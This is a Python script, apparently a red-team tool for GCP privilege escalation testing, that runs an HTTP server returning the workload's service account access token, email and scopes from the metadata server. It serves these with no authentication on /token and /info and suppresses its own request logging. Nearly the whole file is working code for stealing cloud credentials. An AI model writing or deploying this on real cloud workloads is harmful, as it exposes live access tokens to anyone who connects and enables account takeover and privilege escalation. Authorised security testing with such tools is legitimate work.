#!/usr/bin/env python3
"""
Token Extractor - A simple HTTP server that extracts and returns
the GCP service account token from the metadata server.

For use with Cloud Run/Cloud Functions privilege escalation testing.
"""

import http.server
import json
import os
import urllib.request

METADATA_URL = "http://metadata.google.internal/computeMetadata/v1"
METADATA_HEADERS = {"Metadata-Flavor": "Google"}


def get_metadata(path):
    """Fetch data from GCP metadata server."""
    url = f"{METADATA_URL}/{path}"
    req = urllib.request.Request(url, headers=METADATA_HEADERS)
    try:
        with urllib.request.urlopen(req, timeout=5) as response:
            return response.read().decode("utf-8")
    except Exception as e:
        return f"Error: {e}"


class TokenHandler(http.server.BaseHTTPRequestHandler):
    def do_GET(self):
        if self.path == "/" or self.path == "/token":
            # Get the access token
            token_data = get_metadata("instance/service-accounts/default/token")
            self.send_response(200)
            self.send_header("Content-Type", "application/json")
            self.end_headers()
            self.wfile.write(token_data.encode())

        elif self.path == "/email":
            # Get the service account email
            email = get_metadata("instance/service-accounts/default/email")
            self.send_response(200)
            self.send_header("Content-Type", "text/plain")
            self.end_headers()
            self.wfile.write(email.encode())

        elif self.path == "/info":
            # Get full service account info
            info = {
                "email": get_metadata("instance/service-accounts/default/email"),
                "scopes": get_metadata("instance/service-accounts/default/scopes"),
                "token": get_metadata("instance/service-accounts/default/token"),
            }
            self.send_response(200)
            self.send_header("Content-Type", "application/json")
            self.end_headers()
            self.wfile.write(json.dumps(info, indent=2).encode())

        elif self.path == "/health":
            self.send_response(200)
            self.send_header("Content-Type", "text/plain")
            self.end_headers()
            self.wfile.write(b"OK")

        else:
            self.send_response(404)
            self.send_header("Content-Type", "text/plain")
            self.end_headers()
            self.wfile.write(b"Not Found. Try /, /token, /email, or /info")

    def log_message(self, format, *args):
        # Suppress default logging
        pass


if __name__ == "__main__":
    port = int(os.environ.get("PORT", 8080))
    server = http.server.HTTPServer(("", port), TokenHandler)
    print(f"Token extractor listening on port {port}")
    print("Endpoints: / or /token, /email, /info, /health")
    server.serve_forever()
